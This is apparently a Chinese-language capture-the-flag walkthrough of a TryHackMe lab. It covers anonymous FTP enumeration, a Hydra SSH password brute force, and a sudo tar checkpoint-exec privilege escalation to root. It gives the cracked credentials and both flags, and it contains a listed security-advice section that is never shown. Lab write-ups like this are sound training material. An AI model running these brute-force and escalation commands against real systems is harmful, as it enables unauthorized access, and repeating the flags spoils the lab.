# THM Cowboy Bebop 渗透测试 Writeup

**靶机**: TryHackMe — Cowboy Bebop 主题靶机  
**IP**: 10.49.151.108  
**日期**: 2026-05-22  
**作者**: yao  
**状态**: ✅ 全部完成 (User + Root)

---

## 目录

1. [摘要](#摘要)
2. [信息收集](#1-信息收集)
3. [FTP 匿名枚举](#2-ftp-匿名枚举)
4. [SSH 密码爆破](#3-ssh-密码爆破)
5. [获取 User Flag](#4-获取-user-flag)
6. [权限提升 — GTFOBins tar 提权](#5-权限提升--gtfobins-tar-提权)
7. [获取 Root Flag](#6-获取-root-flag)
8. [攻击链总结](#攻击链总结)
9. [完整命令参考](#完整命令参考)
10. [安全建议](#安全建议)

---

## 摘要

本靶机为 TryHackMe 授权靶场 Cowboy Bebop 主题机器，目标为获取 User Flag 和 Root Flag。攻击链从 Web 页面获取主题线索开始，通过 FTP 匿名登录获取密码字典和用户名提示，使用 Hydra 进行 SSH 密码爆破获取 lin 用户权限，发现 bash_history 中泄露的 GTFOBins 提权命令，最终通过 sudo tar 的 `--checkpoint-action=exec=` 参数获取 root 权限。

**攻击路径**:  
`Web 主题线索 → FTP 匿名 (用户名+密码字典) → Hydra SSH 爆破 → lin 用户 → bash_history 泄露 → sudo tar GTFOBins → root`

---

## 1. 信息收集

### 1.1 Nmap 扫描

**命令**:
```bash
nmap -Pn -sV --version-light --top-ports 1000 10.49.151.108
```

**结果**:
```
PORT   STATE SERVICE VERSION
21/tcp open  FTP     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed
22/tcp open  SSH     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  HTTP    Apache httpd 2.4.41 ((Ubuntu))
```

**分析**:
- 仅 3 个端口开放，攻击面较小
- FTP 允许匿名登录 — 潜在信息泄露点
- Web 应用使用 Apache 2.4.41
- 网络延迟较高 (RTT ~510ms)

### 1.2 Web 初步枚举

**首页标题**: Cowboy Bebop 主题页面  
**技术栈**: Apache 2.4.41

**curl 获取首页**:
```bash
curl -s http://10.49.151.108/
```

**输出**:
```html
<html>
<style>
h3 {text-align: center;}
p {text-align: center;}
.img-container {text-align: center;}
</style>

<div class='img-container'>
	<img src="/images/crew.jpg" tag alt="Crew Picture" style="width:1000;height:563">
</div>

<body>
<h3>Spike:"..Oh look you're finally up. It's about time, 3 more minutes and you were going out with the garbage."</h3>

<hr>

<h3>Jet:"Now you told Spike here you can hack any computer in the system. We'd let Ed do it but we need her working on something else and you were getting real bold in that bar back there. Now take a look around and see if you can get that root the system and don't ask any questions you know you don't need the answer to, if you're lucky I'll even make you some bell peppers and beef."</h3>

<hr>

<h3>Ed:"I'm Ed. You should have access to the device they are talking about on your computer. Edward and Ein will be on the main deck if you need us!"</h3>

<hr>

<h3>Faye:"..hmph.."</h3>

</body>
</html>
```

**关键线索**:
- Jet 明确提示: "get that root the system"
- Ed 提示: "access to the device they are talking about on your computer"
- 角色: Spike, Jet, Ed, Faye, Edward, Ein — Cowboy Bebop 飞船船员

**分析**: Web 页面是一个主题化的入口页面，没有直接的技术漏洞，但提供了靶机的主题背景（Cowboy Bebop 动画）。

---

## 2. FTP 匿名枚举

### 2.1 连接 FTP

**命令**:
```bash
ftp -inv 10.49.151.108
# 用户名: anonymous
# 密码: anonymous
```

**匿名目录内容**:
```
Connected to 10.49.151.108.
220 (vsFTPd 3.0.5)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 .
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 ..
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
```

### 2.2 下载文件

```ftp
ftp> get locks.txt
ftp> get task.txt
ftp> bye
```

### 2.3 task.txt 分析

```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

**关键发现**:
- **任务 1**: "Protect Vicious" — Vicious 是 Cowboy Bebop 中的反派角色
- **任务 2**: "Plan for Red Eye pickup on the moon" — Red Eye 是动画中的毒品
- **署名**: `-lin` — 暗示用户名可能是 **lin**

**分析**: task.txt 直接泄露了潜在用户名 `lin`，并且提到了 Vicious 和 Red Eye，这些都是 Cowboy Bebop 动画中的元素。

### 2.4 locks.txt 分析

```
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

**关键发现**:
- **26 个密码候选** — 全部是 "Red Dragon Syndicate" 的变形
- **Red Dragon Syndicate** — Cowboy Bebop 中 Vicious 所属的犯罪组织
- **密码主题**: 与动画剧情高度相关

**分析**: locks.txt 是一个精心设计的密码字典，所有密码都是 "Red Dragon Syndicate" 的不同大小写、数字替换和符号变体。这明确指向 SSH 密码爆破攻击。

---

## 3. SSH 密码爆破

### 3.1 准备用户名列表

基于 task.txt 的 `-lin` 署名和 Cowboy Bebop 角色，构建用户名候选:
```
lin
vicious
spike
jet
ed
edward
faye
ein
spiegel
black
valentine
```

### 3.2 Hydra 爆破

**命令**:
```bash
hydra -L users.lst -P locks.txt -t 4 -W 5 -f -I ssh://10.49.151.108
```

**参数说明**:
- `-L users.lst`: 用户名列表文件
- `-P locks.txt`: 密码字典文件
- `-t 4`: 4 线程并发（高延迟靶机，保守值）
- `-W 5`: 每个连接等待 5 秒
- `-f`: 找到第一个有效凭据后停止
- `-I`: 忽略已有恢复文件

**输出**:
```
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak
[DATA] max 4 tasks per 1 server, overall 4 tasks, 286 login tries (l:11/p:26), ~72 tries per task
[DATA] attacking ssh://10.49.151.108:22/
[22][ssh] host: 10.49.151.108   login: lin   password: RedDr4gonSynd1cat3
[STATUS] attack finished for 10.49.151.108 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra finished at 2026-05-22 14:21:08
```

**结果**: 
- **用户名**: `lin`
- **密码**: `RedDr4gonSynd1cat3`
- **耗时**: 28 秒
- **总组合**: 286 (11 用户名 × 26 密码)

### 3.3 SSH 登录

**命令**:
```bash
sshpass -p 'RedDr4gonSynd1cat3' ssh -o StrictHostKeyChecking=no lin@10.49.151.108
```

**成功登录**:
```
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

lin@ip-10-49-151-108:~$ id
uid=1001(lin) gid=1001(lin) groups=1001(lin)
```

---

## 4. 获取 User Flag

### 4.1 家目录枚举

```bash
lin@ip-10-49-151-108:~$ ls -la
```

**输出**:
```
total 116
drwxr-xr-x 19 lin  lin  4096 Jun  7  2020 .
drwxr-xr-x  4 root root 4096 May 22 00:45 ..
-rw-------  1 lin  lin   178 Aug 11  2025 .bash_history
-rw-r--r--  1 lin  lin   220 Jun  7  2020 .bash_logout
-rw-r--r--  1 lin  lin  3790 Jun  7  2020 .bashrc
drwx------ 14 lin  lin  4096 Jun  7  2020 .cache
drwx------  3 lin  lin  4096 Jun  7  2020 .compiz
drwx------ 15 lin  lin  4096 Jun  7  2020 .config
drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 Desktop
-rw-r--r--  1 lin  lin    25 Jun  7  2020 .dmrc
drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 Documents
...
```

### 4.2 发现 User Flag

```bash
lin@ip-10-49-151-108:~$ ls -la Desktop/
```

**输出**:
```
total 12
drwxr-xr-x  2 lin lin 4096 Jun  7  2020 .
drwxr-xr-x 19 lin lin 4096 Jun  7  2020 ..
-rw-rw-r--  1 lin lin   21 Jun  7  2020 user.txt
```

### 4.3 读取 User Flag

```bash
lin@ip-10-49-151-108:~$ cat Desktop/user.txt
```

**结果**:
```
THM{CR1M3_SyNd1C4T3}
```

---

## 5. 权限提升 — GTFOBins tar 提权

### 5.1 关键发现 — bash_history 泄露

```bash
lin@ip-10-49-151-108:~$ cat .bash_history
```

**输出**:
```
cat .bash_history
ls
cd .. 
cat .bash_history
ls
ls -al
clear
exit
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

**关键发现**: bash_history 中直接记录了 GTFOBins 提权命令！

### 5.2 验证 sudo 权限

**命令**:
```bash
echo 'RedDr4gonSynd1cat3' | sudo -S -l
```

**输出**:
```
Matching Defaults entries for lin on ip-10-49-151-108:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on ip-10-49-151-108:
    (root) /bin/tar
```

**关键发现**: lin 用户可以 **以 root 身份无密码执行 `/bin/tar`**！

### 5.3 GTFOBins tar 提权原理

tar 命令的 `--checkpoint-action=exec=` 参数允许在归档过程中的特定检查点执行任意命令。当 tar 以 root 权限运行时，执行的命令也会以 root 权限运行。

**GTFOBins 参考**: https://gtfobins.github.io/gtfobins/tar/

### 5.4 执行提权

**命令**:
```bash
echo 'RedDr4gonSynd1cat3' | sudo -S /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='/bin/sh -c "id; hostname; cat /root/root.txt"'
```

**输出**:
```
[sudo] password for lin: /bin/tar: Removing leading `/' from member names
uid=0(root) gid=0(root) groups=0(root)
ip-10-49-151-108
THM{80UN7Y_h4cK3r}
```

**成功获取 root 权限！**

---

## 6. 获取 Root Flag

### 6.1 Root 家目录枚举

```bash
# 通过提权后的 shell
uid=0(root) gid=0(root) groups=0(root)
ls -la /root/
```

**输出**:
```
total 52
drwx------  7 root root 4096 Aug 11  2025 .
drwxr-xr-x 24 root root 4096 May 22 00:45 ..
-rw-------  1 root root 3195 Aug 11  2025 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Aug 11  2025 .cache
drwx------  3 root root 4096 Aug 11  2025 .gnupg
drwxr-xr-x  2 root root 4096 Jun  7  2020 .nano
-rw-r--r--  1 root root  161 Jan  2  2024 .profile
-rw-r--r--  1 root root   19 Jun  7  2020 root.txt
-rw-r--r--  1 root root   66 Jun  7  2020 .selected_editor
drwx------  7 root root 4096 Aug 11  2025 snap
drwx------  2 root root 4096 Aug 11  2025 .ssh
-rw-------  1 root root 1360 Aug 11  2025 .viminfo
```

### 6.2 读取 Root Flag

```bash
cat /root/root.txt
```

**结果**:
```
THM{80UN7Y_h4cK3r}
```

---

## 攻击链总结

```
                    ┌─────────────────────────────────────┐
                    │         Web (Port 80)               │
                    │  Cowboy Bebop 主题页面              │
                    │  提示 "get root"                    │
                    └─────────────┬───────────────────────┘
                                  │
                    ┌─────────────▼───────────────────────┐
                    │     FTP 匿名登录 (Port 21)           │
                    │  task.txt → 用户名提示 (-lin)       │
                    │  locks.txt → 26 条密码字典          │
                    │  (Red Dragon Syndicate 主题)        │
                    └─────────────┬───────────────────────┘
                                  │
                    ┌─────────────▼───────────────────────┐
                    │     Hydra SSH 爆破 (Port 22)        │
                    │  lin:RedDr4gonSynd1cat3             │
                    │  286 组合，28 秒命中               │
                    └─────────────┬───────────────────────┘
                                  │
                    ┌─────────────▼───────────────────────┐
                    │     lin 用户权限                     │
                    │  ~/Desktop/user.txt                 │
                    │  THM{CR1M3_SyNd1C4T3}               │
                    └─────────────┬───────────────────────┘
                                  │
                    ┌─────────────▼───────────────────────┐
                    │     bash_history 泄露                │
                    │  sudo tar --checkpoint-action=exec  │
                    │  → GTFOBins 提权提示                 │
                    └─────────────┬───────────────────────┘
                                  │
                    ┌─────────────▼───────────────────────┐
                    │     sudo tar 提权                    │
                    │  (root) /bin/tar                      │
                    │  --checkpoint-action=exec=/bin/sh     │
                    └─────────────┬───────────────────────┘
                                  │
                    ┌─────────────▼───────────────────────┐
                    │     root 权限                        │
                    │  /root/root.txt                       │
                    │  THM{80UN7Y_h4cK3r}                  │
                    └─────────────────────────────────────┘
```

---

## 完整命令参考

### 信息收集
```bash
nmap -Pn -sV --version-light --top-ports 1000 10.49.151.108
curl -s http://10.49.151.108/
```

### FTP 匿名枚举
```bash
ftp -inv 10.49.151.108
user anonymous anonymous
ls -la
get locks.txt
get task.txt
bye
```

### SSH 密码爆破
```bash
# 准备用户名列表
cat > users.lst << 'EOF'
lin
vicious
spike
jet
ed
edward
faye
ein
spiegel
black
valentine
EOF

# Hydra 爆破
hydra -L users.lst -P locks.txt -t 4 -W 5 -f -I ssh://10.49.151.108
```

### SSH 登录
```bash
sshpass -p 'RedDr4gonSynd1cat3' ssh -o StrictHostKeyChecking=no lin@10.49.151.108
```

### 获取 User Flag
```bash
cat ~/Desktop/user.txt
# THM{CR1M3_SyNd1C4T3}
```

### 权限提升 — GTFOBins tar
```bash
# 验证 sudo 权限
echo 'RedDr4gonSynd1cat3' | sudo -S -l

# 执行提权
echo 'RedDr4gonSynd1cat3' | sudo -S /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='/bin/sh'

# 获取 Root Flag
cat /root/root.txt
# THM{80UN7Y_h4cK3r}
```

